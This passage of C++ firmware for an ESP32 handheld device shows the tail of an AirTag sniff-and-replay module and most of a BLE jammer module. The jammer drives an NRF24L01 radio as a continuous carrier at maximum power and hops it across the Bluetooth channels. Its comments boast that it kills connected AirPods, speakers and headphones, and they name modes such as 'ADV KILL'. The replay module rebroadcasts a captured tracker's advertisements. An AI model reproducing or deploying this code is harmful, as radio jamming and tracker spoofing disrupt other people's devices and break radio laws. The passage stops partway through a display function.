    float fillPct = (S->replayRate > 0) ? (float)S->replayRate / 2.0f : 0.0f;
    if (fillPct > 1.0f) fillPct = 1.0f;
    int fillW = (int)(fillPct * barW);
    if (fillW > 0) {
        for (int px = 0; px < fillW; px++) {
            float ratio = (float)px / (float)barW;
            uint16_t c = arGradientColor(ratio);
            tft.drawFastVLine(barX + px, barY + 1, barH - 2, c);
        }
    }

    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    char cntBuf[12];
    snprintf(cntBuf, sizeof(cntBuf), "%lu", S->replayCount);
    tft.setCursor(barX + 4, barY + 1);
    tft.print(cntBuf);

    tft.setTextColor(S->replaying ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), AR_BAR_Y + 3);
    tft.printf("%d rep/s", S->replayRate);

    if (S->replaying) {
        tft.drawBitmap(SCALE_X(220), AR_BAR_Y + 1, bitmap_icon_skull_bluetooth, 16, 16, HALEHOUND_HOTPINK);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// START / STOP / TOGGLE REPLAY
// ═══════════════════════════════════════════════════════════════════════════

static void startReplay() {
    // Must have a selected tag
    bool hasSelection = false;
    for (int i = 0; i < S->tagCount; i++) {
        if (S->captured[i].selected) { hasSelection = true; break; }
    }
    if (!hasSelection) return;

    // Deinit scan before replay — can't scan and advertise simultaneously
    if (S->pArScan) {
        S->pArScan->stop();
        S->pArScan = nullptr;
    }
    BLEDevice::deinit(false);
    delay(100);

    // Re-init for advertising
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    S->replaying = true;
    S->replayCount = 0;
    S->replayRate = 0;
    S->rateWindowCount = 0;
    S->staticDrawn = false;

    // Switch to replay view
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, TFT_BLACK);
    arDrawIconBar();
    arDrawStatus(">> REPLAYING <<", HALEHOUND_HOTPINK);
    arDrawStaticReplayInfo();
    arDrawSkulls();
    arDrawCounterBar();

    startReplayTask();

    #if CYD_DEBUG
    Serial.println("[REPLAY] Started (Core 0)");
    #endif
}

static void stopReplay() {
    stopReplayTask();

    // Re-init for scanning
    BLEDevice::deinit(false);
    delay(100);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pArScan = BLEDevice::getScan();
    if (S->pArScan) {
        S->pArScan->setActiveScan(false);
        S->pArScan->setInterval(100);
        S->pArScan->setWindow(99);
    }

    S->staticDrawn = false;

    // Switch back to list view
    tft.fillRect(0, 63, SCREEN_WIDTH, SCREEN_HEIGHT - 63, TFT_BLACK);
    arDrawIconBar();
    arDrawStatus("SCAN MODE", HALEHOUND_MAGENTA);
    arDrawTagList();

    #if CYD_DEBUG
    Serial.println("[REPLAY] Stopped, back to scan mode");
    #endif
}

static void toggleReplay() {
    if (S->replaying) {
        stopReplay();
    } else {
        startReplay();
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (S && S->initialized) return;

    #if CYD_DEBUG
    Serial.println("[REPLAY] Initializing AirTag Sniff+Replay...");
    #endif

    // Heap-allocate all state (zero-init)
    if (!S) {
        S = (ArState*)calloc(1, sizeof(ArState));
        if (!S) {
            Serial.println("[REPLAY] ERROR: calloc failed");
            return;
        }
    } else {
        memset(S, 0, sizeof(ArState));
    }

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    arDrawIconBar();
    arDrawHeader();

    // Tear down WiFi before BLE init
    WiFi.mode(WIFI_OFF);
    delay(50);

    // Init BLE for scanning
    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);

    S->pArScan = BLEDevice::getScan();
    if (!S->pArScan) {
        Serial.println("[REPLAY] ERROR: getScan() returned NULL");
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(10, 100);
        tft.print("BLE INIT FAILED");
        S->exitRequested = true;
        return;
    }
    S->pArScan->setActiveScan(false);  // Passive — don't alert the tracker
    S->pArScan->setInterval(100);
    S->pArScan->setWindow(99);

    S->initialized = true;

    // First scan
    arDrawStatus("SCANNING...", HALEHOUND_MAGENTA);
    runScan();
    if (S->tagCount > 0) {
        char sbuf[24];
        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
        arDrawStatus(sbuf, HALEHOUND_GREEN);
    } else {
        arDrawStatus("NO TAGS - RESCAN", HALEHOUND_GUNMETAL);
    }
    arDrawTagList();

    S->lastDisplayUpdate = millis();

    // Consume lingering touch from menu selection
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.printf("[REPLAY] Ready, found %d tags\n", S->tagCount);
    #endif
}

void loop() {
    if (!S || !S->initialized) return;

    touchButtonsUpdate();

    // ── Icon bar touch ──────────────────────────────────────────────────
    if (millis() - S->lastIconTap > 250) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_Y && ty <= (ICON_BAR_BOTTOM + 4)) {
                waitForTouchRelease();

                // Back button (x: 10-30)
                if (tx >= 5 && tx <= 30) {
                    if (S->replaying) stopReplay();
                    S->exitRequested = true;
                    S->lastIconTap = millis();
                    return;
                }
                // Scan button (x: 60-80)
                else if (tx >= 50 && tx <= 80) {
                    if (!S->replaying && S->pArScan) {
                        arDrawStatus("SCANNING...", HALEHOUND_MAGENTA);
                        runScan();
                        char sbuf[24];
                        snprintf(sbuf, sizeof(sbuf), "%d TAGS FOUND", S->tagCount);
                        arDrawStatus(sbuf, HALEHOUND_GREEN);
                        arDrawTagList();
                    }
                    S->lastIconTap = millis();
                    return;
                }
                // Play/Stop button (x: 110-130)
                else if (tx >= 100 && tx <= 135) {
                    if (S->tagCount > 0) {
                        // If no tag selected yet, auto-select current
                        if (!S->replaying) {
                            bool anySelected = false;
                            for (int i = 0; i < S->tagCount; i++) {
                                if (S->captured[i].selected) { anySelected = true; break; }
                            }
                            if (!anySelected) {
                                S->captured[S->currentIndex].selected = true;
                            }
                        }
                        toggleReplay();
                    }
                    S->lastIconTap = millis();
                    return;
                }
            }
        }
    }

    // ── Hardware buttons ────────────────────────────────────────────────
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (S->replaying) stopReplay();
        S->exitRequested = true;
        return;
    }

    if (!S->replaying) {
        // ── SCAN PHASE INPUT ────────────────────────────────────────────
        if (buttonPressed(BTN_UP)) {
            if (S->currentIndex > 0) {
                S->currentIndex--;
                if (S->currentIndex < S->listStartIndex) S->listStartIndex--;
                arDrawTagList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (S->currentIndex < S->tagCount - 1) {
                S->currentIndex++;
                if (S->currentIndex >= S->listStartIndex + AR_MAX_VISIBLE) S->listStartIndex++;
                arDrawTagList();
            }
        }

        if (buttonPressed(BTN_SELECT)) {
            if (S->tagCount > 0) {
                // Deselect all, select current (single selection)
                for (int i = 0; i < S->tagCount; i++) S->captured[i].selected = false;
                S->captured[S->currentIndex].selected = true;
                arDrawTagList();
            }
        }

        if (buttonPressed(BTN_RIGHT)) {
            // Start replay if a tag is selected
            if (S->tagCount > 0) {
                bool anySelected = false;
                for (int i = 0; i < S->tagCount; i++) {
                    if (S->captured[i].selected) { anySelected = true; break; }
                }
                if (!anySelected) {
                    S->captured[S->currentIndex].selected = true;
                }
                startReplay();
            }
        }

        // Touch to select device in list
        int touched = getTouchedMenuItem(92, AR_LINE_HEIGHT, min((int)AR_MAX_VISIBLE, (int)(S->tagCount - S->listStartIndex)));
        if (touched >= 0) {
            int idx = S->listStartIndex + touched;
            // Deselect all, select touched
            for (int i = 0; i < S->tagCount; i++) S->captured[i].selected = false;
            S->captured[idx].selected = true;
            S->currentIndex = idx;
            arDrawTagList();
        }
    } else {
        // ── REPLAY PHASE INPUT ──────────────────────────────────────────
        if (buttonPressed(BTN_SELECT) || buttonPressed(BTN_LEFT)) {
            stopReplay();
        }

        // Dynamic display update at ~10fps
        if (millis() - S->lastDisplayUpdate >= 100) {
            arDrawDynamicReplay();
            arDrawSkulls();
            arDrawCounterBar();
            S->lastDisplayUpdate = millis();
        }
    }

    yield();
}

bool isExitRequested() {
    return S ? S->exitRequested : false;
}

void cleanup() {
    if (S) {
        stopReplayTask();

        if (S->pArScan) {
            S->pArScan->stop();
            S->pArScan = nullptr;
        }

        BLEDevice::deinit(false);

        free(S);
        S = nullptr;
    }

    #if CYD_DEBUG
    Serial.println("[REPLAY] Cleanup complete");
    #endif
}

}  // namespace AirTagReplay


// ═══════════════════════════════════════════════════════════════════════════
// BLE JAMMER IMPLEMENTATION - NRF24L01+PA+LNA Continuous Carrier Wave
// Targets Bluetooth 2.402-2.480 GHz band (79 channels)
// Uses same proven NRF24 technique as WLAN Jammer
// Modes: ALL CHANNELS | ADV ONLY (Ch37/38/39) | DATA ONLY
// ═══════════════════════════════════════════════════════════════════════════

namespace BleJammer {

// ═══════════════════════════════════════════════════════════════════════════
// BLE CHANNEL MAPPING
// ═══════════════════════════════════════════════════════════════════════════
// Bluetooth uses 79 x 1MHz channels: 2.402 - 2.480 GHz
// NRF24 channel N = 2400 + N MHz
// BT channel 0 (2402 MHz) = NRF24 channel 2
// BT channel 78 (2480 MHz) = NRF24 channel 80
//
// BLE Advertising channels (most effective targets):
//   Ch 37 = 2402 MHz = NRF24 ch 2
//   Ch 38 = 2426 MHz = NRF24 ch 26
//   Ch 39 = 2480 MHz = NRF24 ch 80
// ═══════════════════════════════════════════════════════════════════════════

#define BJ_BT_NRF_START    2     // BT channel 0 = NRF channel 2
#define BJ_BT_NRF_END      80    // BT channel 78 = NRF channel 80

// BLE Advertising channel NRF24 mappings (used by equalizer display markers)
static const uint8_t BJ_ADV_CHANNELS[] = {2, 26, 80};  // Ch37, Ch38, Ch39
#define BJ_ADV_COUNT 3

// ═══════════════════════════════════════════════════════════════════════════
// CHANNEL ARRAYS — Bruce firmware pattern (PROVEN WORKING ON AIRPODS)
// Bruce: startConstCarrier() once → setChannel() in tight loop = KILLS BLE
// We tried raw SPI, data flooding, CE toggling — all FAILED.
// Bruce's simple pattern WORKS. Don't overthink it.
// ═══════════════════════════════════════════════════════════════════════════

// BLE channels — NRF24 ch 2-41 (all 40 BLE data + advertising channels)
// This is what kills CONNECTED devices (AirPods, speakers, headphones)
static const uint8_t BJ_BLE_CHANNELS[] = {
     2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
    22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41
};
#define BJ_BLE_COUNT 40

// BLE Advertising Priority — Bruce firmware's exact channel set
// Targets ADV frequencies (2402/2426/2480 MHz) + adjacent channels for splash
static const uint8_t BJ_BLE_ADV_CHANNELS[] = {37, 38, 39, 1, 2, 3, 25, 26, 27, 79, 80, 81};
#define BJ_BLE_ADV_COUNT 12

// Full Bluetooth band — NRF24 ch 2-80 (all 79 BT channels)
static const uint8_t BJ_BT_CHANNELS[] = {
     2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21,
    22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41,
    42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61,
    62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80
};
#define BJ_BT_COUNT 79

// ADV KILL — ONLY the 3 BLE advertising channels (maximum focus)
// BLE adv ch 37 = 2402 MHz = NRF24 ch 2
// BLE adv ch 38 = 2426 MHz = NRF24 ch 26
// BLE adv ch 39 = 2480 MHz = NRF24 ch 80
// Each channel gets 33% of jammer time — nowhere to reconnect
static const uint8_t BJ_ADV_KILL_CHANNELS[] = {2, 26, 80};
#define BJ_ADV_KILL_COUNT 3

// Jamming modes
#define BJ_MODE_BLE      0    // BLE data+adv channels — kills connected devices
#define BJ_MODE_BLE_ADV  1    // BLE advertising priority — disrupts discovery/pairing
#define BJ_MODE_BT       2    // Full Bluetooth band — maximum coverage
#define BJ_MODE_ADV_KILL 3    // ADV KILL — 3 channels only, maximum range
#define BJ_MODE_COUNT    4
static const char* BJ_MODE_NAMES[] = {"BLE", "BLE ADV", "BLUETOOTH", "ADV KILL"};

// Mode channel pointers for clean loop access
// Adaptive dwell: target ~1.5ms sweep regardless of channel count
// Fewer channels = longer dwell per channel = same sweep rate for all modes
struct BjJamMode {
    const uint8_t* channels;
    int count;
    int dwellUs;  // microseconds to sit on each channel
};
static const BjJamMode bjModes[] = {
    {BJ_BLE_CHANNELS,      BJ_BLE_COUNT,      38},   // 40ch × 38us = 1.52ms sweep
    {BJ_BLE_ADV_CHANNELS,  BJ_BLE_ADV_COUNT,  125},  // 12ch × 125us = 1.50ms sweep
    {BJ_BT_CHANNELS,       BJ_BT_COUNT,       19},   // 79ch × 19us = 1.50ms sweep
    {BJ_ADV_KILL_CHANNELS, BJ_ADV_KILL_COUNT, 500}   //  3ch × 500us = 1.50ms sweep — MAXIMUM FOCUS
};

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY CONSTANTS - 85-BAR EQUALIZER (matches WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════
#define BJ_GRAPH_X      2
#define BJ_GRAPH_Y      155
#define BJ_GRAPH_WIDTH  GRAPH_FULL_W
#define BJ_GRAPH_HEIGHT 106
#define BJ_NUM_BARS     85

// Skull rows - 3 rows of 8 = 24 skulls (matches SubGHz Jammer)
#define BJ_SKULL_Y           (SCREEN_HEIGHT - 55)
#define BJ_SKULL_ROWS        3
#define BJ_SKULL_ROW_SPACING 18
#define BJ_SKULL_NUM         8

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════
static bool initialized = false;
static bool exitRequested = false;
static volatile bool jamming = false;           // volatile — shared between cores
static int currentMode = BJ_MODE_BLE_ADV;        // Default BLE ADV — proven AirPod killer
static volatile int currentNRFChannel = BJ_BT_NRF_START;  // volatile — read by display, written by jam task
static volatile int hopIndex = 0;
static unsigned long lastDisplayTime = 0;
static volatile int bjHitCount = 0;             // volatile — incremented by jam task, read by display

// Equalizer heat levels
static uint8_t channelHeat[BJ_NUM_BARS] = {0};
static int skullFrame = 0;

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE JAMMER — FreeRTOS task on Core 0
// NRF24 uses VSPI (GPIO 18/19/23). Display uses HSPI (GPIO 12/13/14).
// Separate hardware SPI buses = zero conflict. Jammer runs 100% duty cycle
// on core 0 while display animations run full speed on core 1.
// ═══════════════════════════════════════════════════════════════════════════
static TaskHandle_t bjJamTaskHandle = NULL;
static volatile bool bjJamTaskRunning = false;
static volatile bool bjJamTaskDone = false;      // task signals when cleanup is complete
static volatile int bjJamMode = BJ_MODE_BLE_ADV; // shadow of currentMode for jam task

static void bjJamTask(void* param) {
    // ═══════════════════════════════════════════════════════════════════════
    // ALL SPI + NRF24 operations happen HERE on core 0.
    // ESP32 SPI driver registers ISR on the core that calls spi_bus_initialize().
    // If we init on core 1 and use from core 0, transactions are malformed/weak.
    // Solution: init, use, AND cleanup all on core 0. Core 1 never touches radio.
    // ═══════════════════════════════════════════════════════════════════════

    // Init SPI on THIS core
    SPI.end();
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    delay(5);

    // Init radio on THIS core
    if (!nrf24Radio.begin()) {
        Serial.println("[BLEJAM] Core 0: NRF24 begin() FAILED");
        bjJamTaskDone = true;
        vTaskDelete(NULL);
        return;
    }

    // startConstCarrier — continuous wave, 100% duty cycle, ALWAYS transmitting
    // setChannel() just steers the frequency — carrier never stops
    // This is what was PROVEN to kill AirPods on the spectrum analyzer
    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
    nrf24Radio.setAddressWidth(5);
    nrf24Radio.setPayloadSize(2);
    nrf24Radio.setDataRate(RF24_2MBPS);

    Serial.printf("[BLEJAM] Core 0: SPI + NRF24 initialized, CW carrier active, isPVariant=%d\n",
                  nrf24Radio.isPVariant());

    int localHop = 0;
    int yieldCounter = 0;

    while (bjJamTaskRunning) {
        int mode = bjJamMode;  // local copy to avoid race
        const BjJamMode& m = bjModes[mode];

        localHop++;
        if (localHop >= m.count) localHop = 0;

        uint8_t ch = m.channels[localHop];
        nrf24Radio.setChannel(ch);  // Carrier stays ON, just hops frequency
        delayMicroseconds(m.dwellUs);  // Adaptive dwell — all modes sweep at ~1.5ms

        // Update shared state for display (volatile, races OK for display)
        currentNRFChannel = ch;
        hopIndex = localHop;
        bjHitCount++;

        // Feed watchdog on core 0 — yield every 100 hops
        // Without this, the idle task starves and watchdog reboots the ESP32
        yieldCounter++;
        if (yieldCounter >= 100) {
            yieldCounter = 0;
            vTaskDelay(1);  // 1 tick (~1ms) — keeps WDT happy, 99% duty cycle
        }
    }

    // Cleanup on THIS core — core 1 must NOT touch radio while task is alive
    nrf24Radio.stopConstCarrier();
    nrf24Radio.flush_tx();
    nrf24Radio.powerDown();
    SPI.end();

    Serial.println("[BLEJAM] Core 0: Radio powered down, SPI released");
    bjJamTaskDone = true;
    vTaskDelete(NULL);
}

// Short display names for FreeMonoBold18pt (must fit 240px screen)
static const char* BJ_MODE_DISPLAY[] = {"BLE", "BLE ADV", "BT FULL", "ADV KILL"};

// ═══════════════════════════════════════════════════════════════════════════
// SKULL ICONS (same set as WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════
static const unsigned char* bjSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// ═══════════════════════════════════════════════════════════════════════════
// ICON BAR - 6 icons (matches SubGHz Jammer layout)
// Back(10) | Toggle(60) | PrevMode(105) | NextMode(140) | Antenna(180) | Cycle(215)
// ═══════════════════════════════════════════════════════════════════════════
#define BJ_ICON_SIZE 16
#define BJ_ICON_NUM  6
static int bjIconX[BJ_ICON_NUM] = {10, 60, 105, 140, 180, 215};
static const unsigned char* bjIcons[BJ_ICON_NUM] = {
    bitmap_icon_go_back,           // 0: Back
    bitmap_icon_start,             // 1: Toggle ON/OFF
    bitmap_icon_sort_down_minus,   // 2: Prev mode
    bitmap_icon_sort_up_plus,      // 3: Next mode
    bitmap_icon_antenna,           // 4: NRF24 status indicator
    bitmap_icon_recycle            // 5: Cycle mode
};

// ═══════════════════════════════════════════════════════════════════════════
// JAMMER ENGINE — Bruce firmware pattern (PROVEN ON AIRPODS)
// startConstCarrier() ONCE → setChannel() in tight loop
// DO NOT use raw SPI. DO NOT use data flooding. DO NOT clear REUSE_TX_PL.
// The REUSE_TX_PL flag set by startConstCarrier() on P-variant chips is
// what makes the chip continuously retransmit — it's the FEATURE, not a bug.
// We wasted an entire day trying to "fix" this. Bruce proves it works.
// ═══════════════════════════════════════════════════════════════════════════

// Helper: check if NRF channel is a BLE advertising channel (for equalizer display)
static bool bjIsAdvChannel(int ch) {
    return (ch == 2 || ch == 26 || ch == 80);
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BJ_ICON_NUM; i++) {
        uint16_t color = HALEHOUND_MAGENTA;
        if (i == 1 && jamming) color = HALEHOUND_HOTPINK;   // Toggle icon hot when jamming
        if (i == 4 && jamming) color = HALEHOUND_HOTPINK;  // Antenna icon hot when jamming
        tft.drawBitmap(bjIconX[i], ICON_BAR_Y, bjIcons[i], BJ_ICON_SIZE, BJ_ICON_SIZE, color);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// Helper to draw centered FreeFont text (Proto Kill style)
static void bjDrawFreeFont(int y, const char* text, uint16_t color, const GFXfont* font) {
    tft.setFreeFont(font);
    tft.setTextColor(color, TFT_BLACK);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;
    tft.setCursor(x, y);
    tft.print(text);
    tft.setFreeFont(NULL);
}

// Chromatic aberration / glitch text - corrupted hacker aesthetic
static void bjDrawGlitchText(int y, const char* text, const GFXfont* font) {
    tft.setFreeFont(font);
    int w = tft.textWidth(text);
    int x = (SCREEN_WIDTH - w) / 2;
    if (x < 0) x = 0;

    // Pass 1: Cyan ghost offset left-up
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(x - 1, y - 1);
    tft.print(text);

    // Pass 2: Hot pink ghost offset right-down
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(x + 1, y + 1);
    tft.print(text);

    // Pass 3: White main text on top
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(x, y);
    tft.print(text);

    tft.setFreeFont(NULL);
}

static void drawBjMainUI() {
    // Clear main area
    tft.fillRect(0, 38, SCREEN_WIDTH, 115, TFT_BLACK);

    // Title line (Proto Kill style)
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setCursor(70, 45);
    tft.print("BLE JAMMER");
    tft.drawLine(0, 56, SCREEN_WIDTH, 56, HALEHOUND_HOTPINK);

    // Rounded frame for main content (Proto Kill style)
    tft.drawRoundRect(10, 60, CONTENT_INNER_W, 70, 8, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, 61, CONTENT_INNER_W - 2, 68, 7, HALEHOUND_GUNMETAL);

    // Mode Name - Nosifer18pt with glitch effect
    tft.fillRect(15, 65, SCREEN_WIDTH - 30, 30, TFT_BLACK);
    bjDrawGlitchText(90, BJ_MODE_DISPLAY[currentMode], &Nosifer_Regular12pt7b);

    // Status - Nosifer12pt
    tft.fillRect(15, 100, SCREEN_WIDTH - 30, 25, TFT_BLACK);
    if (jamming) {
        bjDrawFreeFont(120, "JAMMING", HALEHOUND_HOTPINK, &Nosifer_Regular10pt7b);
    } else {
        bjDrawFreeFont(120, "STANDBY", HALEHOUND_GUNMETAL, &Nosifer_Regular10pt7b);
    }

    // Stats line - default font
    tft.setFreeFont(NULL);
    tft.fillRect(0, SCALE_Y(135), SCREEN_WIDTH, 15, TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, SCALE_Y(140));
    tft.printf("CH:%03d", currentNRFChannel);
    tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(SCALE_X(80), SCALE_Y(140));
    tft.printf("CH#:%d", bjModes[currentMode].count);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(170), SCALE_Y(140));
    tft.printf("HITS:%d", bjHitCount);

    // Separator before equalizer
    tft.drawLine(0, 152, SCREEN_WIDTH, 152, HALEHOUND_HOTPINK);
}

static void bjUpdateStatus() {
    // Fast partial update - content inside the frame only
    tft.fillRect(15, 65, SCREEN_WIDTH - 30, 60, TFT_BLACK);
    bjDrawGlitchText(90, BJ_MODE_DISPLAY[currentMode], &Nosifer_Regular12pt7b);
    if (jamming) {
        bjDrawFreeFont(120, "JAMMING", HALEHOUND_HOTPINK, &Nosifer_Regular10pt7b);
    } else {
        bjDrawFreeFont(120, "STANDBY", HALEHOUND_GUNMETAL, &Nosifer_Regular10pt7b);
    }
}

static void bjUpdateStats() {
    // Fast partial update - stats line only
    tft.setFreeFont(NULL);
    tft.setTextSize(1);
    tft.fillRect(10, SCALE_Y(140), 60, 10, TFT_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, SCALE_Y(140));
    tft.printf("CH:%03d", currentNRFChannel);
    tft.fillRect(SCALE_X(80), SCALE_Y(140), 80, 10, TFT_BLACK);
    tft.setTextColor(jamming ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(SCALE_X(80), SCALE_Y(140));
    tft.printf("CH#:%d", bjModes[currentMode].count);
    tft.fillRect(SCALE_X(170), SCALE_Y(140), 70, 10, TFT_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(SCALE_X(170), SCALE_Y(140));
    tft.printf("HITS:%d", bjHitCount);
}

// Forward declaration
static void drawAdvMarkers();

// ═══════════════════════════════════════════════════════════════════════════
// EQUALIZER HEAT LOGIC (matches WLAN/SubGHz Jammer pattern)
// ═══════════════════════════════════════════════════════════════════════════

static void updateChannelHeat() {
    if (!jamming) {
        // Decay all channels when not jamming
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            if (channelHeat[i] > 0) {
                channelHeat[i] = channelHeat[i] / 2;  // Fast decay when stopped
            }
        }
        return;
    }

    if (currentMode == BJ_MODE_BLE || currentMode == BJ_MODE_BT) {
        // BLE/BT modes - band hopping, insane equalizer
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            int dist = abs(i - currentNRFChannel);

            if (i == currentNRFChannel) {
                // Direct hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (dist <= 6) {
                // Splash zone - strong heat with falloff
                int splash = 110 - (dist * 12);
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background chaos - all bars dance randomly
                int chaos = 50 + random(40);
                channelHeat[i] = (channelHeat[i] + chaos) / 2;
            }
        }
    } else {
        // BLE ADV mode - focused attack on advertising channels
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            bool isCurrentChannel = (i == currentNRFChannel);

            // Distance to nearest ADV channel
            int distToNearest = BJ_NUM_BARS;
            for (int a = 0; a < BJ_ADV_COUNT; a++) {
                int d = abs(i - (int)BJ_ADV_CHANNELS[a]);
                if (d < distToNearest) distToNearest = d;
            }

            if (isCurrentChannel) {
                // Currently being hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (bjIsAdvChannel(i)) {
                // Other ADV channels stay warm
                int baseHeat = 70 + random(30);
                channelHeat[i] = (channelHeat[i] + baseHeat) / 2;
            } else if (distToNearest <= 4) {
                // Splash zone around ADV channels
                int splash = 60 - (distToNearest * 12);
                if (splash < 10) splash = 10;
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background - subtle decay
                if (channelHeat[i] > 0) {
                    channelHeat[i] = (channelHeat[i] * 3) / 4;
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// EQUALIZER DISPLAY (85 skinny bars - matches WLAN/SubGHz Jammer)
// ═══════════════════════════════════════════════════════════════════════════

static void drawJammerDisplay() {
    // Update heat levels first
    updateChannelHeat();

    // Clear display area
    tft.fillRect(BJ_GRAPH_X, BJ_GRAPH_Y, BJ_GRAPH_WIDTH, BJ_GRAPH_HEIGHT, TFT_BLACK);

    // Draw frame
    tft.drawRect(BJ_GRAPH_X - 1, BJ_GRAPH_Y - 1, BJ_GRAPH_WIDTH + 2, BJ_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

    int maxBarH = BJ_GRAPH_HEIGHT - 25;

    if (!jamming) {
        // Check if any heat remains (for decay animation)
        bool hasHeat = false;
        for (int i = 0; i < BJ_NUM_BARS; i++) {
            if (channelHeat[i] > 3) { hasHeat = true; break; }
        }

        if (!hasHeat) {
            // Fully stopped - show standby bars
            for (int i = 0; i < BJ_NUM_BARS; i++) {
                int x = BJ_GRAPH_X + (i * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
                int barH = 8 + (i % 5) * 2;  // Slight variation
                int barY = BJ_GRAPH_Y + BJ_GRAPH_HEIGHT - barH - 10;
                tft.drawFastVLine(x, barY, barH, HALEHOUND_GUNMETAL);
                tft.drawFastVLine(x + 1, barY, barH, HALEHOUND_GUNMETAL);
            }

            // Standby text
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(BJ_GRAPH_X + 85, BJ_GRAPH_Y + 5);
            tft.print("STANDBY");

            // ADV channel markers
            drawAdvMarkers();
            return;
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // DRAW THE EQUALIZER - 85 skinny bars of FIRE!
    // ═══════════════════════════════════════════════════════════════════════
    for (int i = 0; i < BJ_NUM_BARS; i++) {
        int x = BJ_GRAPH_X + (i * BJ_GRAPH_WIDTH / BJ_NUM_BARS);
        uint8_t heat = channelHeat[i];

        // Bar height based on heat - MORE AGGRESSIVE scaling
        int barH = (heat * maxBarH) / 100;  // Taller bars!
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 8) barH = 8;  // Higher minimum

        int barY = BJ_GRAPH_Y + BJ_GRAPH_HEIGHT - barH - 8;

        // Color based on heat - vibrant gradient from cyan to hot pink
